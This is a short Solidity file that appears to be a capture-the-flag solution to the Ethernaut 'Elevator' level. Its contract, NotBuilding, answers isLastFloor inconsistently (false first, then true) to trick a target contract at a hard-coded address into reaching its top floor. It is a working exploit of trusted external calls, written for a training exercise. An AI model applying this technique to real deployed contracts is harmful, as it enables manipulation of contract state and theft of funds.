

interface Elevator {
    function goTo(uint _floor) external;
}


contract NotBuilding {

    uint public counter = 0;
    Elevator public elevator;


    constructor() {
        elevator = Elevator(0xE16Dd9eA98A7829FE9c0b3772b5286696b1EB891);
    }

    function goto() public {
        elevator.goTo(69);
    }

    function isLastFloor(uint m) external returns (bool) {
        
        if (counter == 0) {
            counter++;
            return false;
        }
        return true;

    }
}